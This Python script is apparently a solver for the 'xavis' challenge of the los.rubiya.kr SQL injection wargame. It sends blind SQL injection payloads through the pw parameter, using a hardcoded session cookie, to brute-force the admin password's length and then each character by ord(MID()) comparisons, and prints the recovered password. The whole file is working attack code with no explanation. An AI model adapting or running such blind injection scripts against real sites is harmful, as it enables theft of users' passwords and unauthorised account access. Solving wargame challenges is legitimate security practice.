import urllib.request
from urllib.parse import quote

result=""
hex_result = "0x"
pwlen = 0
url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw="

for i in range(1, 50):
     add_url = "' or id='admin' and length(pw)={} -- ;".format(str(i))
     add_url = quote(add_url)
     new_url = url + add_url
     re = urllib.request.Request(new_url)
     re.add_header("User-Agent", "Mozilla/5.0")
     re.add_header("Cookie", "PHPSESSID=rribf8pnj37nlcf445b50vd27o")
     res = urllib.request.urlopen(re)

     print("Finding Password Length.. => {}".format(i))

     if str(res.read()).find("Hello admin") != -1:
         pwlen = i
         print("Found it! Password Length => {}".format(pwlen))
         break

for i in range(1, pwlen + 1):
     for j in range(1, 1000):
         if i == 2 or i == 4:
             j += 40
         add_url = "' || id='admin' and ord(MID(pw,{0},1))='{1}' -- ;".format(i, j)
         print("Matching.. - [{0}] // Result = [{1}] // Hex_Result = [{2}]".format(chr(j), result, hex_result))
         add_url = quote(add_url)
         new_url = url + add_url
         re = urllib.request.Request(new_url)

         re.add_header("User-Agent", "Mozilla/5.0")
         re.add_header("Cookie", "PHPSESSID=rribf8pnj37nlcf445b50vd27o")

         res = urllib.request.urlopen(re)

         if str(res.read()).find("Hello admin") != -1:
             char = chr(j)
             hex_result += str(hex(j)).replace('0x', '')
             result += chr(j)
             print("Found it!! => " + result)
             break

print("Finished Searching.")
print("Password : {0} (Hex : {1})".format(result, hex_result))
